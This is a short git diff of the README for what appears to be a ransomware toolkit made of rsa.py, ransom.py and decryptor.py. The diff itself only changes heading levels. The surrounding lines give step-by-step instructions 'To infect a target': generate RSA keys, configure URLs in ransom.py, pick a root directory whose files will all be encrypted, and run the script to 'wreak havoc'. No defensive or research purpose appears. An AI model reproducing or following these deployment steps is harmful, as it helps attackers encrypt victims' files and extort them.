@@ -20,7 +20,7 @@ Here is a summary of what each script is supposed to do.\
 **decryptor.py**
 - Recover the original files by decrypting the encrypted files using user provided key
 
-# To infect a target
+### To infect a target
 1. Generate RSA key pair with
 ```
 python3 rsa.py -g key
@@ -30,7 +30,7 @@ python3 rsa.py -g key
 4. Modify ransom.py script with the URLs  from step 2 and 3
 5. Specify the root directory. Any files in the root directory and its sub directory will be encrypted.
 6. Execute ransom.py and see it wreak havoc :)
-# To decrypt
+### To decrypt
 1. Retrieve the AES key:
 ```
 python3 rsa.py key_private.pem
